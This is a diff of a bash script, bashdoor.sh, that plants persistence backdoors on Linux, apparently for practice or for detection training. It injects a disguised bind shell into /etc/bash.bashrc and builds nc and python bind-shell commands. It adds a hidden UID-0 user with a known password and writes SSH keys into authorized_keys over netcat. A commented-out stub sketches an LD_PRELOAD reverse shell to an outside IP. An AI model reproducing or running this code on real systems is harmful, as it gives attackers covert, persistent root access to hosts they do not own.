@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # ==============================================================================
-# Script Name: backdoors.sh
+# Script Name: bashdoor.sh
 # Description: Tries to create easily detectable backdoors using different methods.
 # Version: 1.0.0
 # Author: mind2hex
@@ -85,7 +85,7 @@ infect_default_system_account(){
 # Infect bash environment file
 infect_bash_environment_file() {
     # PORT 65534
-    instruction='nohup bash -c "while true; do nc -lvnp 65534 -e /bin/bash > /dev/null 2>&1; done" > /dev/null 2>&1 &'
+    local instruction="nohup bash -c 'while true; do if [[ ! -p gdm3-config-err-s2fkslxkamfmasdw ]];then mkfifo gdm3-config-err-s2fkslxkamfmasdw;fi; cat gdm3-config-err-s2fkslxkamfmasdw | bash -i 2>&1 | nc -lvnp 65534 > gdm3-config-err-s2fkslxkamfmasdw; done' > /dev/null 2>&1 &"
     # Infecting user environment file
     if [[ -e /etc/bash.bashrc && $EUID -eq 0 ]];then
         # Inserting instruction in the start of file /etc/bash.bashrc
@@ -117,14 +117,57 @@ infect_bash_environment_file() {
     fi
 }
 
+create_malicious_shared_library(){
+    # NOT READY YET
+    # echo 'void _init() { system("/bin/bash -i >& /dev/tcp/192.168.1.100/4444 0>&1"); }' > payload.c
+    # gcc -shared -fPIC -o /tmp/mylib.so payload.c
+    # export LD_PRELOAD=/tmp/mylib.so
+}
+
+create_malicious_user(){
+    if [[ $EUID -ne 0 ]];then
+        return
+    fi
+
+    useradd -M -s /bin/bash -u 0 -o -g 0 kernoopsie
+    usermod -p '$6$rb931J8MmQGko1gm$ZcXsXL38YtHn/4dslAbNyUFPEkT2DL0bt/W0q8xVTBBVg2PbOAm4IAULZDX5taqf7Q6BeHUOkcEcj1oHWrr.31' kernoopsie
+    # kernoopsie:backdoor
+}
+
+backdoor_method_finder(){
+    if nc -h 2>&1  | grep -o "\-e[^[:alnum:]]" -m1;then
+        command="nc -lvnp PORT-NUMBER -e /bin/bash"
+    elif nc -h 2>&1 | grep -o "\-c[^[:alnum:]]" -m1;then
+        command="nc -lvnp PORT-NUMBER -c '/bin/bash'"
+    elif which python3 >/dev/null 2>&1;then
+        command="python3 -c 'import socket,os,pty;s=socket.socket();s.bind((\"0.0.0.0\",PORT-NUMBER));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/bash\")'"
+    else
+        command=""
+    fi
+}
+
+infect_ssh_authorized_files(){
+    if [[ $(echo "`systemctl status ssh.service`" | grep -o "Active: [a-zA-Z]*" -m1 | cut -d " " -f 2) == "inactive" ]];then
+        return
+    fi
+
+    # Execute from attacking machine
+    # cat ~/.ssh/id_rsa.pub | nc target 6922
+    # ssh 
+    echo "User:$(whoami)" | nc -lvnp 6922 >> ~/.ssh/authorized_keys
+}
 
 # Main logic of the script
 main() {
+    backdoor_method_finder
     infect_bash_environment_file
-    infect_default_system_account
-    #infect_service_configuration
-    create_malicious_cronjob
-    create_malicious_service
+    #infect_default_system_account
+    ##infect_service_configuration
+    ##infect_ssh_authorized_files
+    #create_malicious_shared_library
+    #create_malicious_cronjob
+    #create_malicious_service
+    #create_malicious_user
 }
 
 # Run the main function
